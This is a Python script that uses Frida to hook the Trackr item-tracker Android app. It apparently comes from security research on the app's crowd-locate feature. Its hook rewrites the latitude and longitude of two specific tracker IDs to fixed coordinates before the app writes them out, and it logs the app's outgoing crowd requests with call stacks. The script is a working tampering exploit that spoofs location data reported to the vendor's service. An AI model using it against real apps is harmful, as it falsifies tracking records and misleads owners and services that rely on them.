import frida, sys

def on_message(message, data):
    if message['type'] == 'send':
        print("[*] {0}".format(message['payload']))
    else:
        print(message)

jscode = """
Java.perform(function () {
    // Function to hook is defined here
    var MainActivity = Java.use('java.io.BufferedWriter');
    var url = Java.use("java.net.URL");
    
    var threadef = Java.use('java.lang.Thread');
    var threadinstance = threadef.$new();
    
    function Where(stack) {
        var at = '';
        for(var i = 0; i < stack.length; i++) {
            at = at + i.toString() + '\\t' + stack[i].toString() + '\\n';
        }
        return at;
    }
    
    // Whenever button is clicked
    MainActivity.write.overload('java.lang.String', 'int', 'int').implementation = function (v1, v2, v3) {
        // Show a message to know that the function got called
        console.log('\\n\\n\\n\\n---------------------');
        send('write is called: ');
        
        // v1 = 'dsds';
        // v3 = 4;
        
        var retval = 0;
        
        var stack = threadinstance.currentThread().getStackTrace()
        var full_call_stack = Where(stack)
        
        if(v1.toString().includes("latitude") && v1.toString().includes("trackerId") && (v1.toString().includes("000006a1-a06705d6") || v1.toString().includes("0000e443-2d6e1bda"))) {
            // Call the original onClick handler
            console.log('Original stuff:' + v1)
            var allObjs = JSON.parse(v1);
            for (var i = 0; i < allObjs.length; i++) {
                var obj = allObjs[i]; 
                obj.lastKnownLocation.latitude = 30.7749;
                obj.lastKnownLocation.longitude = -101.8415702;
                
            }
            
            v1 = JSON.stringify(allObjs);
            v3 = v1.length;
            retval = this.write(v1, v2, v3);
            console.log('Sending third party trackr info:' + v1.toString());
        } else {
            retval = this.write(v1, v2, v3);
            // Log to the console that it's done, and we should have the flag!
            console.log('General Trackr Info:' + v1.toString() + ', arg 2:' + v2 + ', arg 3:' + v3);
        }
        console.log('Retval: ' + retval);
        
        // retval = this.write(v1, v2, v3);
        // Log to the console that it's done, and we should have the flag!
        console.log('General Trackr Info:' + v1.toString() + ', arg 2:' + v2 + ', arg 3:' + v3 + ", call stack:\\n" + full_call_stack);
        
        console.log('Retval: ' + retval);
        console.log('---------------------\\n\\n\\n\\n');
    };

    var Activity2 = Java.use('com.phonehalo.itemtracker.crowd.CrowdClient');

    Activity2.sendRequest.overload('java.net.HttpURLConnection', 'org.json.JSONObject').implementation = function(v1, v2) {
        console.log('\\n\\n\\n\\n---------------------');
        send('sendRequest(http, JSONObject) is called: ' + v1);

        console.log('\\n\\nContents are: ' + v2.toString());

        var stack = threadinstance.currentThread().getStackTrace()
        var full_call_stack = Where(stack)

        console.log('call stack:\\n' + full_call_stack);
        return Activity2.sendRequest.overload('java.net.HttpURLConnection', 'org.json.JSONObject').call(this, v1, v2);
    };



    //var Activity3 = Java.use('com.phonehalo.itemtracker.crowd.response.CreateItemResponse');

    //Activity3.createItemWithTracker.overload('java.lang.String', 'java.lang.String', 'java.lang.String', 'java.lang.String', 'java.lang.String', 'long').implementation = function(v1, v2, v3, v5, v5, v6) {
    //   console.log('\\n\\n\\n\\n---------------------');
    //    send('createItemWithTracker is called: ');

    //    console.log('\\nContents are: \\n');
    //    console.log('v1: ' + v1.toString());
    //    console.log('v2: ' + v2.toString());
    //    console.log('v3: ' + v3.toString());
    //    console.log('v4: ' + v4.toString());
    //    console.log('v5: ' + v5.toString());
    //    console.log('v6: ' + v6.toString());
    //};

});
"""


process = frida.get_usb_device().attach('com.phonehalo.itemtracker')
script = process.create_script(jscode)
script.on('message', on_message)
print('[*] Running Trackr')
script.load()
sys.stdin.read()
